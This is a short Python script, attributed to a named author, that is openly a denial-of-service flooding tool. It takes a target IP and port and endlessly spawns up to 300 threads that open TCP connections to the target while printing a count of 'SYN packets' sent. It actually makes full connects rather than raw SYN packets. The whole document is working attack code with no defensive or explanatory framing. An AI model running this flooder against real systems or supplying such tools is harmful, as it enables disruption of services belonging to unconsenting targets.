#Author : Ayushi Rajendra Kumar
import socket
import random
import sys
import threading

target       = None
port         = None
thread_limit = 300
total        = 0


class sendSYN(threading.Thread):
	global target, port
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):
		s = socket.socket()
		s.connect((target,port))


if( __name__ == "__main__"):
    if (len(sys.argv) != 3):
        print(len(sys.argv))
        print( "Usage: %s <Target IP> <Port>" % sys.argv[0])
        exit()
    target           = sys.argv[1]
    port             = int(sys.argv[2])
    print ("Flooding %s:%i with SYN packets." % (target, port))
    cnt=0
    while True:
        if (threading.activeCount() < thread_limit): 
            sendSYN().start()
            total += 1
            sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
